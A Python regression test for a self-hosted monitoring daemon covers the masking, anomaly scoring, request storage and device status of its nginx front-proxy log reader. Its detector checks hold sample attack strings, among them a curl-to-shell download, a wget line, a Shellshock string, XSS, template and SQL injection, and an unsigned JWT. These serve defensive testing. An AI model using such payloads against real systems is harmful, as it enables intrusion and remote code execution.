#!/usr/bin/env python3
"""Pass 3 over what 5.45 and 5.46 added for the server in front: its full
logs, their masking, the table they are kept in, its card and its device.
Every check here fails on 5.46.0.

    python3 test/pass3_proxy.py < /dev/null

  1. the payload words (VALUE_LOOKS) are linear: 100 kB of "{{" took 36 s in
     one re.search, holding the GIL - no other thread of the daemon ran
  2. ...and say nothing of a Sharp phone's agent ("; SH-53C"), an Indonesian
     one's ("; id-id;") or a cookie called id
  3. a quoted secret is masked whole ("correct horse battery" kept "horse
     battery"); a link's secret in a Referer's whole address is masked; a
     path masked once and read again keeps its last two - in Python and in a
     real nginx with the front maps (where installed)
  4. a full-log line with a status that is no number ("-", "abc", 1e999,
     NaN) does not stop the reading
  5. an odd method on the one-tap road is weighed by the access log's reader
     alone, not by both; a JWT whose header cannot be read is no forgery
  6. a reading masks each line once, not four times
  7. a search of the kept requests runs on a reader of its own, not under
     the store's lock, and is held to its time; forgetting goes a chunk at a
     time
  8. a look at the server in front that fails puts its device offline (it
     stayed online, green, for hours); look() is not an SSH per call and
     does not forget the last look

Made-up names and addresses throughout. Nothing listens but 127.0.0.1:19650
and 19651 (nginx, where installed).
"""
import base64
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
W = Path(tempfile.mkdtemp(prefix='zigmon-pass3p-'))
NGX_PORT, NGX_BACK = 19650, 19651
bad = []


def check(ok, what):
    if not ok:
        bad.append(what)
        print('  FAILED: ' + what)
    else:
        print('  ok: ' + what.split(' - ')[0].split(':')[0])
    return ok


def finish():
    shutil.rmtree(W, ignore_errors=True)
    print('pass3_proxy: %s' % ('FAILED (%d)' % len(bad) if bad else 'ok'))
    sys.stdout.flush()
    os._exit(1 if bad else 0)


sys.argv = ['zigmon']
DAEMON_DIR = Path(os.environ.get('PASS3_DAEMON') or str(HERE))   # its deploy/ beside it
sys.path.insert(0, str(DAEMON_DIR))
import zigmon                                                # noqa: E402

zigmon.load_config()
zigmon.CONFIG.update({'db_file': str(W / 'z.db'), 'api_port': 19652, 'api_host': '127.0.0.1',
                      'token_file': str(W / 'token'), 'pin': '', 'plugs': [], 'sensors': [],
                      'mqtt_host': '', 'log_file': '', 'log_to_journal': False,
                      'state_dir': str(W / 'state'), 'never_block': '', 'block_ladder': '',
                      'block_mode': 'temporary', 'blacklist': 1, 'block_score': 15, 'feeds_ban': 0,
                      'feeds': '', 'intel_shodan': 0, 'intel_on_block': 0, 'mikrotik_host': '',
                      'mikrotik_list': '', 'trusted_proxies': '', 'proxy_host': '', 'proxy_log': '',
                      'proxy_watch': 0, 'proxy_full_watch': 0, 'suricata_watch': 0, 'ntfy_watch': 0})
(W / 'state').mkdir()
d = zigmon.Daemon()
d.notify = lambda *a, **k: None
d.mikrotik_after_change = lambda *a, **k: None
d.feed_wanted = lambda: []
d.proxy_run = lambda command: ''

LINK = 'Zt4xQ9wLmP2vR8kS'
PHRASE = 'correct horse battery staple'


def iso(ago=0):
    return time.strftime('%Y-%m-%dT%H:%M:%S+00:00', time.gmtime(time.time() - ago))


def full(ip, **more):
    one = {'ip': ip, 't': iso(5), 'm': 'GET', 'u': '/', 'proto': 'HTTP/1.1', 's': 404, 'bytes': 0,
           'took': 0.0, 'host': 'tap.example.net', 'ua': 'Mozilla/5.0', 'ref': '', 'ct': '', 'clen': '',
           'body': '', 'secret': 'none', 'code': 'none', 'auth': 'none', 'cookie': 'none'}
    one.update(more)
    return json.dumps(one, separators=(',', ':'))


def kinds_of(ip):
    rows = [x for x in d.anomaly_state() if x['ip'] == ip]
    return [k['kind'] for k in (rows[0]['kinds'] if rows else [])]


def fresh():
    d.store.unblock()
    d.forget_anomaly()
    d._blocked_times.clear()


try:
    # ---- 1. linear ----------------------------------------------------------
    print('1. the payload words take milliseconds, whatever they are handed')
    worst = []
    for name, text in (('{{', '{{' * 50000), ('<svg', '<svg' * 25000), ('union /**/', 'union /**/ ' * 10000),
                       ('<svg on', '<svg on' * 14000), ('"pass" ', '"pass" ' * 14000),
                       ('pass=', 'pass=' * 20000)):
        t = time.time()
        zigmon.value_looks(text)
        zigmon.mask_auth('Bearer ' + text)
        zigmon.mask_cookie(text)
        zigmon.mask_pairs(text)
        worst.append((time.time() - t, name))
    took, name = max(worst)
    check(took < 0.5, '100 kB of %r took %.2f s (5.46.0: 36 s for "{{", the GIL held throughout)' % (name, took))
    # ...and while it runs, the rest of the daemon runs too
    gaps, stop = [], []

    def tick():
        last = time.time()
        while not stop:
            time.sleep(0.005)
            now = time.time()
            gaps.append(now - last)
            last = now
    th = threading.Thread(target=tick, daemon=True)
    th.start()
    time.sleep(0.05)
    for _ in range(4):           # four 8 kB headers, what nginx lets through by default
        zigmon.full_mask({'ip': '203.0.113.9', 'ua': '{{' * 4000, 'ref': '<svg' * 2000,
                          'cookie': '{{' * 4000, 'auth': 'Bearer ' + '{{' * 4000})
        d._header_findings(zigmon.full_mask({'ua': '{{' * 4000, 'acc': '<svg' * 2000, 'lang': '{{' * 4000}),
                           'GET', '/', 404)
    stop.append(1)
    th.join(2)
    check(max(gaps) < 0.15, 'another thread waited %.2f s while a request of four 8 kB headers was read'
          % max(gaps))
    for text, word in ((';id;', 'shell'), ('; curl http://198.51.100.1/x|sh', 'shell'), ('a;wget http://x', 'shell'),
                       ('() { :; }; /bin/bash -c id', 'shell'), ('<svg/onload=alert(1)>', 'xss'),
                       ('{{7*7}}', 'template'), ('union/**/select 1', 'sqli'), ('x; id', 'shell')):
        check(word in zigmon.value_looks(text), 'a payload is no longer seen: %r -> %r'
              % (text, zigmon.value_looks(text)))

    # ---- 2. not the house's phones -------------------------------------------
    print('2. an agent or a cookie is not a shell command')
    for text in ('Mozilla/5.0 (Linux; Android 13; SH-53C Build/S1) AppleWebKit/537.36 Chrome/141.0 Mobile',
                 'Mozilla/5.0 (Linux; U; Android 4.4.2; id-id; SM-G7102 Build/KOT49H) AppleWebKit/534.30',
                 'theme=dark; id=5; sh=2', 'NC-Client/2.1; nc_x=1'):
        check(zigmon.value_looks(text) == '', 'taken for a payload: %r -> %r' % (text[:50], zigmon.value_looks(text)))
    one = zigmon.full_mask({'ip': '203.0.113.7', 'ua': 'Mozilla/5.0 (Linux; Android 13; SH-53C) Chrome/141.0',
                            'cookie': 'theme=dark; id=5'})
    check(not d._header_findings(one, 'GET', '/', 200), 'a Sharp phone with a cookie called id is a payload: %r'
          % d._header_findings(one, 'GET', '/', 200))

    # ---- 3. masked whole -----------------------------------------------------
    print('3. a secret is masked whole, wherever it stands')
    for text in (json.dumps({'user': 'jan', 'password': PHRASE}), "{'password': '%s'}" % PHRASE,
                 '{"token": "a \\" %s"}' % PHRASE):
        out = zigmon.mask_pairs(text)
        check('horse' not in out and 'staple' not in out and zigmon.mask_pairs(out) == out,
              'a quoted secret with spaces in it: %r' % out)
    check(zigmon.mask_pairs('{"password":""}') == '{"password":""}', 'an empty value is changed')
    check(zigmon.mask_pairs('spin=4&pin=1234&x=1') == 'spin=4&pin=•&x=1', 'pin and spin: %r'
          % zigmon.mask_pairs('spin=4&pin=1234&x=1'))
    for ref in ('https://tap.example.net/tap/%s' % LINK, 'https://tap.example.net/api/tap/%s?x=1' % LINK):
        out = zigmon.full_mask({'ref': ref, 'xou': ref})
        check(LINK not in json.dumps(out) and out['ref'].endswith(('/tap/•' + LINK[-2:], '?x=1')),
              'a link\'s secret in a Referer: %r' % out.get('ref'))
    once = zigmon.full_mask({'u': '/tap/%s?x=1' % LINK})
    check(zigmon.full_mask(once) == once, 'a path masked twice is not masked once: %r -> %r'
          % (once.get('u'), zigmon.full_mask(once).get('u')))
    if not shutil.which('nginx'):
        print('  SKIPPED: no nginx here')
    else:
        N = W / 'ngx'
        (N / 'logs').mkdir(parents=True)
        (N / 'tmp').mkdir()
        maps = []
        for f in ('nginx-tap-front.conf', 'nginx-ntfy-front.conf'):
            text = (DAEMON_DIR / 'deploy' / f).read_text()
            for block in re.finditer(r'(?ms)^map \$\S+ \$\S+ \{.*?^\}\n|^log_format \w+ escape=json\n.*?\';\n', text):
                maps.append(block.group(0))
        (N / 'front.conf').write_text('\n'.join(maps))
        (N / 'nginx.conf').write_text('''worker_processes 1; pid %(n)s/nginx.pid; error_log %(n)s/logs/error.log; daemon on;
events {}
http { client_body_temp_path tmp; proxy_temp_path tmp; fastcgi_temp_path tmp; uwsgi_temp_path tmp; scgi_temp_path tmp;
  include %(n)s/front.conf;
  server { listen 127.0.0.1:%(p)d; access_log %(n)s/logs/tap.log tapfull; access_log %(n)s/logs/ntfy.log ntfyfull;
    client_body_buffer_size 8k; location / { proxy_pass http://127.0.0.1:%(b)d; } }
  server { listen 127.0.0.1:%(b)d; access_log off; location / { return 200 ok; } }
}
''' % {'n': N, 'p': NGX_PORT, 'b': NGX_BACK})
        got = subprocess.run(['nginx', '-p', str(N), '-c', str(N / 'nginx.conf')], capture_output=True, text=True,
                             stdin=subprocess.DEVNULL)
        if check(got.returncode == 0, 'nginx would not start with the front maps: %s' % got.stderr[-400:]):
            def send(path, headers=None, body=None):
                req = urllib.request.Request('http://127.0.0.1:%d%s' % (NGX_PORT, path), data=body,
                                             headers=headers or {}, method='POST' if body else 'GET')
                try:
                    urllib.request.urlopen(req, timeout=10).read()
                except urllib.error.URLError:
                    pass
            try:
                send('/favicon.ico', {'Referer': 'https://tap.example.net/tap/%s' % LINK})
                send('/tap', {'Content-Type': 'application/json'},
                     json.dumps({'user': 'jan', 'password': PHRASE, 'token': 'a b', 'x': 1}).encode())
                send('/tap?x=1', {'Content-Type': 'application/json'},
                     json.dumps({'password': 'pw1 x', 'secret': 'pw2 y', 'pin': 'pw3 z', 'code': 'pw4 w'}).encode())
                send('/x', {'Cookie': 'theme=dark; id=5', 'Authorization': 'Bearer x; id;'})
                time.sleep(0.5)
            finally:
                try:
                    os.kill(int((N / 'nginx.pid').read_text().strip()), 15)
                except (OSError, ValueError):
                    pass
            for name in ('tap.log', 'ntfy.log'):
                written = (N / 'logs' / name).read_text(errors='replace')
                check(len(written.splitlines()) == 4, 'nginx wrote %d lines for 4 requests'
                      % len(written.splitlines()))
                check(LINK not in written and 'horse' not in written and not re.search(r'pw[1-4] ', written)
                      and '"a b"' not in written, 'nginx (%s) wrote a secret whole: %s' % (name, written[:600]))
                lines = [json.loads(x) for x in written.splitlines() if x.startswith('{')]
                check(lines and lines[-1].get('cookielook') == '' and lines[-1].get('authlook') == 'shell',
                      'a cookie called id, by the map: %r' % ({k: lines[-1].get(k) for k in
                                                              ('cookielook', 'authlook')} if lines else None))

    # ---- 4. a status that is no number ---------------------------------------
    print('4. a status that is no number does not stop the reading')
    fresh()
    for n, status in enumerate(('-', 'abc', [200], {'a': 1}, '2001:db8::1')):
        try:
            d.full_weigh([full('198.51.100.%d' % (10 + n), s=status, u='/.env')])
            ok = True
        except Exception as e:                          # noqa: BLE001
            ok = False
            said = '%s: %s' % (type(e).__name__, e)
        check(ok, 'a status of %r raised out of the weighing%s' % (status, '' if ok else ': ' + said))
    for raw in ('{"ip":"198.51.100.20","s":1e999,"u":"/.env","m":"GET"}',
                '{"ip":"198.51.100.21","s":NaN,"u":"/.env","m":"GET"}'):
        try:
            d.full_weigh([raw, full('198.51.100.22', u='/.git/config', which='ntfy')])
            ok = True
        except Exception as e:                          # noqa: BLE001
            ok = False
        check(ok and 'proxy-secret-hunt' in kinds_of('198.51.100.22'),
              'a line saying %s stopped the lines after it' % raw[30:40])
    status_of = getattr(zigmon.Daemon, '_full_status', None)
    check(status_of and status_of('200') == 200 and status_of(404.0) == 404 and status_of(True) == 0,
          'the status read from a string or a float')

    # ---- 5. weighed once -----------------------------------------------------
    print('5. one request, weighed once')
    zigmon.CONFIG.update({'proxy_host': 'front.example', 'proxy_log': '/var/log/nginx/zigmon-tap.log',
                          'proxy_watch': 1})
    fresh()
    ip = '198.51.100.30'
    # two requests, each in both files: the reading weighs one file and then
    # the other, so the same request is never the one just before it
    d.proxy_weigh(['%s - - [%s] "%s /tap HTTP/1.1" 405 0 "-" "Mozilla/5.0"'
                   % (ip, time.strftime('%d/%b/%Y:%H:%M:%S +0000', time.gmtime(time.time() - ago)), m)
                   for m, ago in (('DELETE', 6), ('PUT', 5))])
    d.full_weigh([full(ip, m='DELETE', u='/tap', s=405, t=iso(6)), full(ip, m='PUT', u='/tap', s=405, t=iso(5))])
    noted = [k for _t, k, _d in d._anomaly.get(ip, [])]
    check(noted.count('proxy-odd-method') == 2, 'DELETE and PUT /tap, read from both logs: %r' % noted)
    fresh()
    d.full_weigh([full('198.51.100.31', m='PROPFIND', u='/', s=405, which='ntfy')])
    check('proxy-odd-method' in kinds_of('198.51.100.31'), 'the notification server\'s odd method is not weighed')
    zigmon.CONFIG.update({'proxy_host': '', 'proxy_log': '', 'proxy_watch': 0})
    fresh()
    d.full_weigh([full('198.51.100.32', m='PROPFIND', u='/', s=405)])
    check('proxy-odd-method' in kinds_of('198.51.100.32'), 'with no access log read, the full log no longer weighs it')
    fresh()
    junk = 'eyJ' + 'q' * 20                       # starts like a JWT, reads as nothing
    d.full_weigh([full('198.51.100.33', auth='Bearer %s.eyJzdWIiOiIxIn0.c2lnbmF0dXJlLXNpZw' % junk)])
    check('proxy-forged-token' not in kinds_of('198.51.100.33'), 'a header that cannot be read is a forgery')
    head = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().rstrip('=')
    d.full_weigh([full('198.51.100.34', auth='Bearer %s.eyJzdWIiOiIxIn0.c2lnbmF0dXJlLXNpZw' % head)])
    check('proxy-forged-token' in kinds_of('198.51.100.34'), '"alg": "none" is no longer a forgery')

    # ---- 6. masked once ------------------------------------------------------
    print('6. a reading masks each line once')
    zigmon.CONFIG.update({'proxy_host': 'front.example', 'proxy_log': '/l/tap.log', 'proxy_watch': 1,
                          'proxy_full_watch': 1, 'proxy_full_log': '/l/full.log', 'ntfy_full_log': '',
                          'proxy_error_log': ''})
    FULL = ''.join(full('198.51.100.%d' % (40 + n % 20), s=200 if n % 3 else 404, u='/x%d' % n) + '\n'
                   for n in range(300)).encode()
    FILES = {'/l/tap.log': b'', '/l/full.log': FULL}

    def fake(command):
        m = re.match(r'^stat -c %s (\S+)$', command)
        if m:
            return str(len(FILES.get(m.group(1), b'')))
        m = re.match(r'^tail -c \+(\d+) (\S+) \| head -c 2000000$', command)
        if m:
            return FILES.get(m.group(2), b'')[int(m.group(1)) - 1:].decode()
        return ''
    d.proxy_run = fake
    calls = []
    real_mask = zigmon.full_mask

    def counted(one):
        calls.append(1)
        return real_mask(one)
    zigmon.full_mask = counted
    try:
        d.proxy_sweep(whole=True)
    finally:
        zigmon.full_mask = real_mask
        d.proxy_run = lambda command: ''
    check(len(calls) <= 300, '300 lines were masked %d times in one reading' % len(calls))
    with d.store.lock:
        kept = d.store.db.execute("SELECT COUNT(*) FROM proxy_requests WHERE uri LIKE '/x%'").fetchone()[0]
    check(kept == 300, 'the reading kept %d of its 300 requests' % kept)
    zigmon.CONFIG.update({'proxy_host': '', 'proxy_log': '', 'proxy_watch': 0, 'proxy_full_watch': 0})

    # ---- 7. the table --------------------------------------------------------
    print('7. the kept requests: searched beside the lock, forgotten a chunk at a time')
    now = time.time()
    rows = [(now - 9 * 86400 + n, 'p3-%d' % n, 'tap', '203.0.113.%d' % (n % 250), 'GET', '/page/%d' % n, 404,
             'tap.example.net', 'Mozilla/5.0 (X11; Linux x86_64)', json.dumps({'acc': 'x' * 900, 'n': n}), '', '')
            for n in range(120000)]
    d.store.keep_proxy_requests(rows)

    class Watched:
        """The store's lock, counting who takes it from the thread asking."""
        def __init__(self, real):
            self.real, self.taken, self.longest, self.started, self.holds = real, 0, 0.0, [], []

        def __enter__(self):
            self.real.acquire()
            if threading.current_thread() is asker[0]:
                self.taken += 1
            self.started.append(time.time())
            return self

        def __exit__(self, *a):
            held = time.time() - self.started.pop()
            self.holds.append(held)
            self.longest = max(self.longest, held)
            self.real.release()
            return False

        def acquire(self, *a, **k):
            return self.real.acquire(*a, **k)

        def release(self):
            return self.real.release()
    asker = [threading.current_thread()]
    real_lock = d.store.lock
    w = Watched(real_lock)
    d.store.lock = w
    try:
        t = time.time()
        got, more, total = d.store.proxy_requests_list(q='nothing-anywhere-like-this')
        took = time.time() - t
    finally:
        d.store.lock = real_lock
    print('  (a search through %d rows: %.2f s)' % (total, took))
    check(w.taken == 0, 'a search held the store\'s lock %d time(s), %.2f s, while it read %d rows'
          % (w.taken, w.longest, total))
    old = getattr(d.store, 'PROXY_REQUESTS_SEARCH_S', 4.0)
    d.store.PROXY_REQUESTS_SEARCH_S = 0.05
    try:
        t = time.time()
        d.store.proxy_requests_list(q='nothing-anywhere-like-this')
        took = time.time() - t
    finally:
        d.store.PROXY_REQUESTS_SEARCH_S = old
    check(took < 0.5, 'a search held to 0.05 s took %.2f s' % took)
    got, more, total = d.store.proxy_requests_list(q='/page/1199', limit=5)
    check(got and got[0]['uri'].startswith('/page/1199') and more, 'the search no longer finds: %r'
          % [x['uri'] for x in got])
    w = Watched(real_lock)
    d.store.lock = w
    try:
        t = time.time()
        gone = d.store.proxy_requests_forget(7)
        took = time.time() - t
    finally:
        d.store.lock = real_lock
    print('  (%d rows forgotten in %.2f s, the lock taken %d times, held %.3f s at the longest, %.3f s at the median)'
          % (gone, took, len(w.holds), w.longest, sorted(w.holds)[len(w.holds) // 2] if w.holds else 0))
    # a chunk now and then waits for the journal's checkpoint; the median is
    # what the rest of the house waits behind
    median = sorted(w.holds)[len(w.holds) // 2] if w.holds else took
    check(gone >= 120000 and len(w.holds) > 10 and median < 0.05,
          'forgetting %d rows took the store\'s lock %d time(s), %.2f s at the median' % (gone, len(w.holds), median))
    most = d.store.PROXY_REQUESTS_MOST
    d.store.PROXY_REQUESTS_MOST = 5000
    try:
        d.store.keep_proxy_requests([(now - n, 'p3b-%d' % n, 'tap', '203.0.113.1', 'GET', '/b/%d' % n, 404,
                                      '', '', '{}', '', '') for n in range(12000)])
        d.store.proxy_requests_forget(0)
        with d.store.lock:
            n_left, top = d.store.db.execute('SELECT COUNT(*), MAX(id) FROM proxy_requests').fetchone()
            newest = d.store.db.execute('SELECT MIN(id) FROM proxy_requests').fetchone()[0]
        check(n_left == 5000 and top - newest == 4999, 'the ceiling kept %d rows' % n_left)
    finally:
        d.store.PROXY_REQUESTS_MOST = most

    # ---- 8. the card and the device ------------------------------------------
    print('8. the server in front: its device says what its card says')
    zigmon.CONFIG.update({'proxy_host': 'front.example', 'proxy_log': '/var/log/nginx/zigmon-tap.log',
                          'proxy_watch': 1, 'suricata_log': '/var/log/suricata/eve.json'})
    STATE = {'up': True, 'runs': 0}

    def tile_run(command):
        STATE['runs'] += 1
        if not STATE['up']:
            raise OSError('ssh: connect to host front.example port 22: Connection refused')
        found = re.search(r'echo "(ZTILE-[0-9a-f]+) \$1"', command)
        m = found.group(1) if found else 'ZTILE-x'
        return '\n'.join([m + ' up', '1047212.55 3340.79', m + ' load', '0.42 0.31 0.18 1/108 1429',
                          m + ' host', 'edge-proxy', m + ' svc', 'nginx active', 'suricata active',
                          m + ' nginx', 'N 214 12 30 1', m + ' end', ''])
    d.proxy_run = tile_run

    def look_now():
        n = int(d.__dict__.get('_proxy_tile_runs') or 0)
        d._proxy_tile_look = dict(d.__dict__.get('_proxy_tile_look') or {}, at=0, tried=0)
        d.__dict__.pop('_proxy_tile_started', None)
        zigmon.proxy_tile_look(d)
        end = time.time() + 10
        while time.time() < end and int(d.__dict__.get('_proxy_tile_runs') or 0) <= n:
            time.sleep(0.02)
        time.sleep(0.05)

    def device():
        return next((x for x in d.status()['devices'] if x['id'] == 'proxy:front'), {})
    look_now()
    check(device().get('online') and zigmon.proxy_tile_state(d)['state'] == 'online', 'not online after a look')
    STATE['up'] = False
    look_now()
    tile = zigmon.proxy_tile_state(d)
    dev = device()
    facts = d.message_facts('a test')
    check(tile['state'] == 'offline' and not dev.get('online') and facts.get('proxy_state') == 'offline',
          'the look failed: the card says %r, Devices says online=%r, {proxy_state} %r'
          % (tile['state'], dev.get('online'), facts.get('proxy_state')))
    STATE['up'] = True
    look_now()
    check(device().get('online') and zigmon.proxy_tile_state(d)['state'] == 'online',
          'not online again after the next look that answered')
    at = zigmon.proxy_tile_state(d)['at']
    runs = STATE['runs']
    said = [d.object_call('device:proxy:front', 'look', '', 'a test')]
    check(zigmon.proxy_tile_state(d)['at'] == at and zigmon.proxy_tile_state(d)['state'] == 'online',
          'look() forgot the last look: %r' % zigmon.proxy_tile_state(d)['state'])
    # a rule calling it on every reading of a sensor: each call once the last
    # look has come back
    for _ in range(4):
        end = time.time() + 5
        while time.time() < end and d.__dict__.get('_proxy_tile_looking'):
            time.sleep(0.02)
        time.sleep(0.05)
        said.append(d.object_call('device:proxy:front', 'look', '', 'a test'))
    time.sleep(0.5)
    check(STATE['runs'] - runs <= 1 and 'being read now' in str(said[0]),
          'five calls of look() a moment apart ran %d SSH command(s): %r' % (STATE['runs'] - runs, said[:2]))
    check(not (d.__dict__.get('_proxy_tile_look') or {}).get('now'), 'a look() asked for stays asked for')
except Exception:                                                # noqa: BLE001
    import traceback
    traceback.print_exc()
    bad.append('the test itself broke')
finish()
